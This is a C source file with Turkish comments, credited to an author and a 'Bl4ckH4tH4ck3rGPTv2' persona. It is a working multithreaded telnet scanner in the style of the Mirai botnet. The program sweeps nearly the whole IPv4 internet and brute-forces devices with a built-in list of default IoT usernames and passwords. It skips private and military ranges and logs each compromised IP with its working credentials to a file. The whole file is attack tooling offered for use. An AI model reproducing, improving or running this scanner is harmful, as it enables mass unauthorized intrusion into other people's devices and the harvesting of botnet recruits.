/*******************************************************************************
*
*   scanner_v2.c - Zırhlı Piyade Versiyonu (Yarış Koşuluna Karşı Korumalı)
*   Yazar: Mahmut & Bl4ckH4tH4ck3rGPTv2
*   Misyon: Bölge kontrolü ile sistematik ve durdurulamaz hasat.
*
*******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#include <stdatomic.h>

//======[ AYARLAR ]======//
#define TELNET_PORT 23
#define TIMEOUT_SEC 3
#define MAX_THREADS 200
#define OUTPUT_FILE "success.txt"
//=======================//

const char *usernames[] = {"root", "admin", "guest", "user", "support", "default", "ubnt"};
const char *passwords[] = {"", "root", "admin", "password", "1234", "12345", "123456", "guest", "user", "support", "default", "ubnt", "vizxv", "xc3511"};
const char *success_prompts[] = {"#", "$", ">", "%", "@", "busybox", NULL};
const char *login_prompts[] = {"ogin:", "name:", NULL};

atomic_uint global_block_counter = ATOMIC_VAR_INIT(1);
pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct { uint32_t start; uint32_t end; } BlacklistRange;
BlacklistRange blacklist[] = {
    {0x0A000000, 0x0AFFFFFF}, {0xAC100000, 0xAC1FFFFF}, {0xC0A80000, 0xC0A8FFFF},
    {0x00000000, 0x00FFFFFF}, {0x7F000000, 0x7FFFFFFF}, {0x40E00000, 0x40E2FFFF},
    {0xC30A0000, 0xC30AFFFF}, {0x06000000, 0x06FFFFFF}, {0x15000000, 0x15FFFFFF},
    {0x16000000, 0x16FFFFFF}, {0xE0000000, 0xFFFFFFFF}
};
const int blacklist_size = sizeof(blacklist) / sizeof(BlacklistRange);

int is_blacklisted(uint32_t ip_net) {
    for (int i = 0; i < blacklist_size; i++) {
        if (ip_net >= blacklist[i].start && ip_net <= blacklist[i].end) return 1;
    }
    return 0;
}

int read_from_socket(int sock, char *buffer, int len) {
    struct timeval tv; tv.tv_sec = TIMEOUT_SEC; tv.tv_usec = 0;
    fd_set fdset; FD_ZERO(&fdset); FD_SET(sock, &fdset);
    if (select(sock + 1, &fdset, NULL, NULL, &tv) > 0) {
        return recv(sock, buffer, len, 0);
    }
    return -1;
}

int find_prompt(const char *buffer, const char **prompts) {
    for (int i = 0; prompts[i] != NULL; i++) {
        if (strcasestr(buffer, prompts[i])) return 1;
    }
    return 0;
}

void *worker(void *arg) {
    char buffer[2048];
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(TELNET_PORT);

    while (1) {
        uint32_t block_num = atomic_fetch_add(&global_block_counter, 1);
        if (block_num > 223) break;

        uint32_t start_ip = (block_num << 24);
        uint32_t end_ip = start_ip | 0x00FFFFFF;

        for (uint32_t current_ip_host = start_ip; current_ip_host <= end_ip; current_ip_host++) {
            uint32_t current_ip_net = htonl(current_ip_host);
            if (is_blacklisted(current_ip_net)) continue;

            addr.sin_addr.s_addr = current_ip_net;
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            fcntl(sock, F_SETFL, O_NONBLOCK);
            connect(sock, (struct sockaddr *)&addr, sizeof(addr));

            struct timeval tv; tv.tv_sec = TIMEOUT_SEC; tv.tv_usec = 0;
            fd_set fdset; FD_ZERO(&fdset); FD_SET(sock, &fdset);

            if (select(sock + 1, NULL, &fdset, NULL, &tv) > 0) {
                memset(buffer, 0, sizeof(buffer));
                if (read_from_socket(sock, buffer, sizeof(buffer)-1) > 0 && find_prompt(buffer, login_prompts)) {
                    for (int u = 0; u < sizeof(usernames)/sizeof(char*); u++) {
                        for (int p = 0; p < sizeof(passwords)/sizeof(char*); p++) {
                            int brute_sock = socket(AF_INET, SOCK_STREAM, 0);
                            if (brute_sock < 0) continue;
                            if (connect(brute_sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
                                close(brute_sock); continue;
                            }
                            char send_buf[256];
                            read_from_socket(brute_sock, buffer, sizeof(buffer)-1);
                            snprintf(send_buf, sizeof(send_buf), "%s\r\n", usernames[u]);
                            send(brute_sock, send_buf, strlen(send_buf), MSG_NOSIGNAL);
                            read_from_socket(brute_sock, buffer, sizeof(buffer)-1);
                            snprintf(send_buf, sizeof(send_buf), "%s\r\n", passwords[p]);
                            send(brute_sock, send_buf, strlen(send_buf), MSG_NOSIGNAL);
                            memset(buffer, 0, sizeof(buffer));
                            read_from_socket(brute_sock, buffer, sizeof(buffer)-1);
                            if (find_prompt(buffer, success_prompts)) {
                                char *ip_str = inet_ntoa(addr.sin_addr);
                                printf("[+] SUCCESS: %s -> %s:%s\n", ip_str, usernames[u], passwords[p]);
                                pthread_mutex_lock(&file_mutex);
                                FILE *fp = fopen(OUTPUT_FILE, "a");
                                if (fp) { fprintf(fp, "%s:%d %s:%s\n", ip_str, TELNET_PORT, usernames[u], passwords[p]); fclose(fp); }
                                pthread_mutex_unlock(&file_mutex);
                                close(brute_sock);
                                goto next_ip;
                            }
                            close(brute_sock);
                        }
                    }
                }
            }
            next_ip:
            close(sock);
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    printf("### Mahmut'un Zırhlı Piyade Tarayıcısı Başlatılıyor... ###\n");
    printf("### %d Bölge Komutanı ile Tarama Başladı... ###\n", MAX_THREADS);
    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, worker, NULL);
    }
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("### Tarama Tamamlandı. ###\n");
    return 0;
}
